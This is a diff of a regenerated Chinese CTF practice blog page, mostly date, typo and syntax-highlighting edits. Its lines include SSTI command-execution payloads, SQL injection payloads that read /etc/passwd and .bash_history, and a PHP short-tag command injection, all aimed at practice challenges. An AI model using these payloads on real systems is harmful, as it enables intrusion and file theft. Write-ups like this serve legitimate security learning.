@@ -46,7 +46,7 @@
 
    <style>
     body{
-       background-image: url(https://cdn.jsdelivr.net/gh/Tokisaki-Galaxy/res/site/medias/background.jpg);
+       background-image: url(https://epicture.oss-cn-beijing.aliyuncs.com/gh/Tokisaki-Galaxy/res/site/medias/background.jpg);
        background-repeat:no-repeat;
        background-size: cover;
        background-attachment:fixed;
@@ -487,14 +487,14 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-05-27
+                    2022-05-28
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    35.7k
+                    35.6k
                 </div>
                 
 
@@ -2966,7 +2966,7 @@ if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&
 <p>例三：<br>popen</p>
 <pre class="language-none"><code class="language-none">&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[258](&#39;ls&#39;,shell&#x3D;True,stdout&#x3D;-1).communicate()[0].strip()&#125;&#125;
 &#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[258](&#39;ls &#x2F;flasklight&#39;,shell&#x3D;True,stdout&#x3D;-1).communicate()[0].strip()&#125;&#125;
-&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[258](&#39;cat &#x2F;flasklight&#x2F;coomme_geeeett_youur_flek&#39;,</code></pre>
+&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[258](&#39;cat &#x2F;flasklight&#x2F;coomme_geeeett_youur_flek&#39;)&#125;&#125;</code></pre>
 
 <h2 id="RCTF2015-EasySQL"><a href="#RCTF2015-EasySQL" class="headerlink" title="[RCTF2015]EasySQL"></a>[RCTF2015]EasySQL</h2><p>这也是个二次注入</p>
 <p>注册后登录再修改密码</p>
@@ -3125,7 +3125,7 @@ else&#123;
 &#125;
 ?&gt;</code></pre>
 
-<p>输入的内容都被addslashes过滤了，但是再comment部分，category是直接从数据库中调出来的，也就是说这里存在二次注入</p>
+<p>输入的内容都被addslashes过滤了，但是在comment部分，category是直接从数据库中调出来的，也就是说这里存在二次注入</p>
 <p>在发帖部分：的category里输入x&#39;,content=database(),/*</p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211117213616672.png" alt="image-20211117213616672"></p>
 <p>再在提交留言里</p>
@@ -3152,11 +3152,11 @@ else&#123;
 <p>在发帖之前还有个登录界面，用户名和密码前几位直接给了，剩下三位爆破得到666</p>
 <p>&#39;,content=(select(load_file(&quot;/etc/passwd&quot;))),/*</p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211117214221610.png" alt="image-20211117214221610"></p>
-<p>（我也不知道查这里的目的是什么，但是百度其他师傅的wp都有这步</p>
-<p>应该是为了知道.bash_histroy文件的路径</p>
+<p>这一步应该是为了知道.bash_histroy文件的路径</p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211117214325543.png" alt="image-20211117214325543"></p>
 <p> &#39;,content=(select(load_file(&quot;/home/www/.bash_history&quot;))),/*</p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211117214355622.png" alt="image-20211117214355622"></p>
+<p>我们看到进行了一个解压然后复制和删除的操作，而.DS_Store只在/var/www/html/目录下被删除了，/tmp/html目录下依然存在</p>
 <p>接着再查.DS_Store</p>
 <p> &#39;,content=(select hex(load_file(&quot;/tmp/html/.DS_Store&quot;))),/*</p>
 <p>为了使其全部显示，要用hex编码</p>
@@ -3232,92 +3232,92 @@ function getflag() &#123;
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/15873007950084a1a7b518c2216100ff330f7ed7a6.png" alt="img"></p>
 <p>访问一下controllers路径下的api.js</p>
 <p>额，这里赵总说是经验。。。</p>
-<pre class="language-none"><code class="language-none">const crypto &#x3D; require(&#39;crypto&#39;);
-const fs &#x3D; require(&#39;fs&#39;)
-const jwt &#x3D; require(&#39;jsonwebtoken&#39;)
+<pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">const</span> crypto <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'crypto'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span>
+<span class="token keyword">const</span> jwt <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'jsonwebtoken'</span><span class="token punctuation">)</span>
 
-const APIError &#x3D; require(&#39;..&#x2F;rest&#39;).APIError;
+<span class="token keyword">const</span> APIError <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'../rest'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>APIError<span class="token punctuation">;</span>
 
-module.exports &#x3D; &#123;
-    &#39;POST &#x2F;api&#x2F;register&#39;: async (ctx, next) &#x3D;&gt; &#123;
-        const &#123;username, password&#125; &#x3D; ctx.request.body;
+module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+    <span class="token string">'POST /api/register'</span><span class="token operator">:</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">ctx<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">const</span> <span class="token punctuation">&#123;</span>username<span class="token punctuation">,</span> password<span class="token punctuation">&#125;</span> <span class="token operator">=</span> ctx<span class="token punctuation">.</span>request<span class="token punctuation">.</span>body<span class="token punctuation">;</span>
 
-        if(!username || username &#x3D;&#x3D;&#x3D; &#39;admin&#39;)&#123;
-            throw new APIError(&#39;register error&#39;, &#39;wrong username&#39;);
-        &#125;
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>username <span class="token operator">||</span> username <span class="token operator">===</span> <span class="token string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">APIError</span><span class="token punctuation">(</span><span class="token string">'register error'</span><span class="token punctuation">,</span> <span class="token string">'wrong username'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
 
-        if(global.secrets.length &gt; 100000) &#123;
-            global.secrets &#x3D; [];
-        &#125;
+        <span class="token keyword">if</span><span class="token punctuation">(</span>global<span class="token punctuation">.</span>secrets<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">100000</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            global<span class="token punctuation">.</span>secrets <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
 
-        const secret &#x3D; crypto.randomBytes(18).toString(&#39;hex&#39;);
-        const secretid &#x3D; global.secrets.length;
-        global.secrets.push(secret)
+        <span class="token keyword">const</span> secret <span class="token operator">=</span> crypto<span class="token punctuation">.</span><span class="token function">randomBytes</span><span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">const</span> secretid <span class="token operator">=</span> global<span class="token punctuation">.</span>secrets<span class="token punctuation">.</span>length<span class="token punctuation">;</span>
+        global<span class="token punctuation">.</span>secrets<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>secret<span class="token punctuation">)</span>
 
-        const token &#x3D; jwt.sign(&#123;secretid, username, password&#125;, secret, &#123;algorithm: &#39;HS256&#39;&#125;);
+        <span class="token keyword">const</span> token <span class="token operator">=</span> jwt<span class="token punctuation">.</span><span class="token function">sign</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>secretid<span class="token punctuation">,</span> username<span class="token punctuation">,</span> password<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> secret<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>algorithm<span class="token operator">:</span> <span class="token string">'HS256'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-        ctx.rest(&#123;
-            token: token
-        &#125;);
+        ctx<span class="token punctuation">.</span><span class="token function">rest</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
+            token<span class="token operator">:</span> token
+        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-        await next();
-    &#125;,
+        <span class="token keyword">await</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
 
-    &#39;POST &#x2F;api&#x2F;login&#39;: async (ctx, next) &#x3D;&gt; &#123;
-        const &#123;username, password&#125; &#x3D; ctx.request.body;
+    <span class="token string">'POST /api/login'</span><span class="token operator">:</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">ctx<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">const</span> <span class="token punctuation">&#123;</span>username<span class="token punctuation">,</span> password<span class="token punctuation">&#125;</span> <span class="token operator">=</span> ctx<span class="token punctuation">.</span>request<span class="token punctuation">.</span>body<span class="token punctuation">;</span>
 
-        if(!username || !password) &#123;
-            throw new APIError(&#39;login error&#39;, &#39;username or password is necessary&#39;);
-        &#125;
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>username <span class="token operator">||</span> <span class="token operator">!</span>password<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">APIError</span><span class="token punctuation">(</span><span class="token string">'login error'</span><span class="token punctuation">,</span> <span class="token string">'username or password is necessary'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
 
-        const token &#x3D; ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;
+        <span class="token keyword">const</span> token <span class="token operator">=</span> ctx<span class="token punctuation">.</span>header<span class="token punctuation">.</span>authorization <span class="token operator">||</span> ctx<span class="token punctuation">.</span>request<span class="token punctuation">.</span>body<span class="token punctuation">.</span>authorization <span class="token operator">||</span> ctx<span class="token punctuation">.</span>request<span class="token punctuation">.</span>query<span class="token punctuation">.</span>authorization<span class="token punctuation">;</span>
 
-        const sid &#x3D; JSON.parse(Buffer.from(token.split(&#39;.&#39;)[1], &#39;base64&#39;).toString()).secretid;
+        <span class="token keyword">const</span> sid <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>Buffer<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span>token<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'base64'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>secretid<span class="token punctuation">;</span>
 
-        console.log(sid)
+        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>sid<span class="token punctuation">)</span>
 
-        if(sid &#x3D;&#x3D;&#x3D; undefined || sid &#x3D;&#x3D;&#x3D; null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;&#x3D; 0)) &#123;
-            throw new APIError(&#39;login error&#39;, &#39;no such secret id&#39;);
-        &#125;
+        <span class="token keyword">if</span><span class="token punctuation">(</span>sid <span class="token operator">===</span> <span class="token keyword">undefined</span> <span class="token operator">||</span> sid <span class="token operator">===</span> <span class="token keyword">null</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token punctuation">(</span>sid <span class="token operator">&lt;</span> global<span class="token punctuation">.</span>secrets<span class="token punctuation">.</span>length <span class="token operator">&amp;&amp;</span> sid <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">APIError</span><span class="token punctuation">(</span><span class="token string">'login error'</span><span class="token punctuation">,</span> <span class="token string">'no such secret id'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
 
-        const secret &#x3D; global.secrets[sid];
+        <span class="token keyword">const</span> secret <span class="token operator">=</span> global<span class="token punctuation">.</span>secrets<span class="token punctuation">[</span>sid<span class="token punctuation">]</span><span class="token punctuation">;</span>
 
-        const user &#x3D; jwt.verify(token, secret, &#123;algorithm: &#39;HS256&#39;&#125;);
+        <span class="token keyword">const</span> user <span class="token operator">=</span> jwt<span class="token punctuation">.</span><span class="token function">verify</span><span class="token punctuation">(</span>token<span class="token punctuation">,</span> secret<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>algorithm<span class="token operator">:</span> <span class="token string">'HS256'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-        const status &#x3D; username &#x3D;&#x3D;&#x3D; user.username &amp;&amp; password &#x3D;&#x3D;&#x3D; user.password;
+        <span class="token keyword">const</span> status <span class="token operator">=</span> username <span class="token operator">===</span> user<span class="token punctuation">.</span>username <span class="token operator">&amp;&amp;</span> password <span class="token operator">===</span> user<span class="token punctuation">.</span>password<span class="token punctuation">;</span>
 
-        if(status) &#123;
-            ctx.session.username &#x3D; username;
-        &#125;
+        <span class="token keyword">if</span><span class="token punctuation">(</span>status<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            ctx<span class="token punctuation">.</span>session<span class="token punctuation">.</span>username <span class="token operator">=</span> username<span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
 
-        ctx.rest(&#123;
+        ctx<span class="token punctuation">.</span><span class="token function">rest</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
             status
-        &#125;);
+        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-        await next();
-    &#125;,
+        <span class="token keyword">await</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
 
-    &#39;GET &#x2F;api&#x2F;flag&#39;: async (ctx, next) &#x3D;&gt; &#123;
-        if(ctx.session.username !&#x3D;&#x3D; &#39;admin&#39;)&#123;
-            throw new APIError(&#39;permission error&#39;, &#39;permission denied&#39;);
-        &#125;
+    <span class="token string">'GET /api/flag'</span><span class="token operator">:</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">ctx<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span>ctx<span class="token punctuation">.</span>session<span class="token punctuation">.</span>username <span class="token operator">!==</span> <span class="token string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">APIError</span><span class="token punctuation">(</span><span class="token string">'permission error'</span><span class="token punctuation">,</span> <span class="token string">'permission denied'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
 
-        const flag &#x3D; fs.readFileSync(&#39;&#x2F;flag&#39;).toString();
-        ctx.rest(&#123;
+        <span class="token keyword">const</span> flag <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        ctx<span class="token punctuation">.</span><span class="token function">rest</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
             flag
-        &#125;);
+        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-        await next();
-    &#125;,
+        <span class="token keyword">await</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
 
-    &#39;GET &#x2F;api&#x2F;logout&#39;: async (ctx, next) &#x3D;&gt; &#123;
-        ctx.session.username &#x3D; null;
-        ctx.rest(&#123;
-            status: true
-        &#125;)
-        await next();
-    &#125;
-&#125;;</code></pre>
+    <span class="token string">'GET /api/logout'</span><span class="token operator">:</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">ctx<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+        ctx<span class="token punctuation">.</span>session<span class="token punctuation">.</span>username <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
+        ctx<span class="token punctuation">.</span><span class="token function">rest</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
+            status<span class="token operator">:</span> <span class="token boolean">true</span>
+        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+        <span class="token keyword">await</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre>
 
 <p>赵总wp里的审计:</p>
 <p>注册 /api/register，接受传入的 username 和 password，先判断 username 不为 admin，然后生成一个 key 来以这些信息为依据，生成一个 jwt 令牌，key 同时存入全局数组。</p>
@@ -3948,8 +3948,6 @@ switch($_GET[&quot;action&quot;] ?? &quot;&quot;) &#123;
 <p>过滤；可以利用短标签，过滤eval可以采用反引号，过滤空格可以用\t</p>
 <pre class="language-none"><code class="language-none">PHP中有两种短标签，&lt;??&gt;和&lt;?&#x3D;?&gt;。其中，&lt;??&gt;相当于对&lt;?php&gt;的替换。而&lt;?&#x3D;?&gt;则是相当于&lt;? echo&gt;。</code></pre>
 
-
-
 <pre class="language-none"><code class="language-none">?action&#x3D;upload&amp;data&#x3D;&lt;?&#x3D;&#96;ls\t&#x2F;&#96;?&gt;</code></pre>
 
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211206210913770.png" alt="image-20211206210913770"></p>
@@ -4363,7 +4361,7 @@ echo &quot;)&lt;br&gt;&quot;;</code></pre>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211210213306758.png" alt="image-20211210213306758"></p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211210213358180.png" alt="image-20211210213358180"></p>
 <p>index.php</p>
-<pre class="language-none"><code class="language-none">&lt;?php
+<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
 session_start();
 if (!isset($_SESSION[&#39;login&#39;])) &#123;
     header(&quot;Location: login.php&quot;);
@@ -4381,7 +4379,7 @@ $a-&gt;Size();
 ?&gt;</code></pre>
 
 <p>download.php</p>
-<pre class="language-none"><code class="language-none">&lt;?php
+<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
 session_start();
 if (!isset($_SESSION[&#39;login&#39;])) &#123;
     header(&quot;Location: login.php&quot;);
@@ -4409,7 +4407,7 @@ if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename) &amp;&amp; st
 </code></pre>
 
 <p>login.php</p>
-<pre class="language-none"><code class="language-none">&lt;?php
+<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
 session_start();
 if (isset($_SESSION[&#39;login&#39;])) &#123;
     header(&quot;Location: index.php&quot;);
@@ -4444,7 +4442,7 @@ if (isset($_POST[&quot;username&quot;]) &amp;&amp; isset($_POST[&quot;password&q
 ?&gt;</code></pre>
 
 <p>class.php</p>
-<pre class="language-none"><code class="language-none">&lt;?php
+<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
 error_reporting(0);
 $dbaddr &#x3D; &quot;127.0.0.1&quot;;
 $dbuser &#x3D; &quot;root&quot;;
@@ -4590,7 +4588,7 @@ class File &#123;
 </code></pre>
 
 <p>delete.php</p>
-<pre class="language-none"><code class="language-none">&lt;?php
+<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
 session_start();
 if (!isset($_SESSION[&#39;login&#39;])) &#123;
     header(&quot;Location: login.php&quot;);
@@ -4626,7 +4624,7 @@ if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename)) &#123;
 <p>对于本题而言，第一条满足，第二条有一个魔术方法__call()和FileList类、User类的__destruct()，恐怕想不利用它们也不行，第三条后半部分没问题，前半部分则需要我们找一找。</p>
 <p>既文件操作函数，就应该在本题的File类（至多也在FileList类）的方法中寻找，毕竟整个题目基本上都是在面向对象的基础上编程，对文件的操作也都是对File类的对象的操作，</p>
 <p>我们看到，open()方法调用了file_exists()和is_dir()函数（注意name方法里的basename函数不算），size()方法调用了filesize()函数，delete()方法调用了unlink()函数，close()方法file_get_contents()函数。</p>
-<p>我们前面提到了，本题要读取/flag.txt文件，故刚刚列举的这些函数中，虽然文件操作函数不少，可以用来触发反序列化，对读取文件有用的只有close()方法中的file_get_contents()函数这一个，所以我们可以对它分析，</p>
+<p>本题要读取/flag.txt文件，故刚刚列举的这些函数中，虽然文件操作函数不少，可以用来触发反序列化，对读取文件有用的只有close()方法中的file_get_contents()函数这一个，所以我们可以对它分析，</p>
 <p>这个时候，如果想不到__call()方法和__destruct()方法，基本上就可以放弃了，在phar题目里，魔术方法一般来讲是必须要用的，</p>
 <p>这里我们看到，FileList的__call()方法语义简单，就是遍历files数组，对每一个file变量执行一次$func，然后将结果存进$results数组，</p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220206173648992.png" alt="image-20220206173648992"></p>
@@ -5463,7 +5461,7 @@ $(function () {
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">159.9k</span>
+                        class="white-color">159.8k</span>
             
             
             
